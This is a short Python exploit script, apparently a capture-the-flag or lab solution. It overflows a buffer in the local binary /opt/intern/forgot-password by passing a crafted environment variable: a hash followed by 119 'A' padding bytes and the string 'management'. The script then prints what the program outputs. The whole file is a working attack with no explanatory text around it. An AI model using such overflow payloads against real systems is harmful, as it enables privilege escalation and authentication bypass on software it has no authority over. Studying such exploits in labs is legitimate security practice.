#!/usr/bin/env python3

import subprocess
import os

HASH = "327a6c4304ad5938eaf0efb6cc3e53dc"
binary_path = '/opt/intern/forgot-password'
payload = HASH + (151 - 32) * 'A' + 'management'

def exploit_overwrite():
    try:
        os.environ["DEHASH"] = payload
        process = subprocess.Popen(
            [binary_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False
        )
        stdout, stderr = process.communicate()
        print("Output of the program:")
        print(stdout.decode('latin-1'))

    except FileNotFoundError:
        print(f"Could not find {binary_path} binary file")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit_overwrite()
